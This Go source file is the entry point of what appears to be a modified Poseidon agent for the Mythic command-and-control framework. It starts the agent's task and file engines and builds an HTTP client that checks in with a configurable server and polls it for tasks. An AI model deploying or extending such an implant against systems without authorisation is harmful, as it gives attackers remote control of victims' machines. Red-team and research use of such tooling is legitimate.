package main

import (
	"context"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/tasks"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/ui/pollclient"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/files"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/p2p"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
)

func main() {
	ctx := context.Background()

	// Initialize the internal engine (no Mythic, no profiles)
	tasks.Initialize()
	responses.Initialize(func() chan structs.MythicMessage { return nil })
	files.Initialize()
	p2p.Initialize()

	client := buildClientFromEnv()

	if err := client.Run(ctx); err != nil {
		log.Fatalf("uiclient exited with error: %v", err)
	}
}

func buildClientFromEnv() *pollclient.Client {
	// Use config package values as defaults, allow env var overrides
	baseURL := getenvDefault("POSEIDON_UI_BASEURL", config.UIBaseURL)
	checkinPath := getenvDefault("POSEIDON_UI_CHECKIN_PATH", config.UICheckinPath)
	pollPath := getenvDefault("POSEIDON_UI_POLL_PATH", config.UIPollPath)
	pollInterval := time.Duration(config.UIPollInterval) * time.Second
	if v := os.Getenv("POSEIDON_UI_POLL_INTERVAL_SECONDS"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			pollInterval = time.Duration(n) * time.Second
		}
	}

	httpClient := &http.Client{Timeout: time.Duration(config.UIHTTPTimeout) * time.Second}

	return pollclient.New(pollclient.Config{
		BaseURL:     baseURL,
		CheckinPath: checkinPath,
		PollPath:    pollPath,
		Interval:    pollInterval,
		HTTPClient:  httpClient,
	})
}

func getenvDefault(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

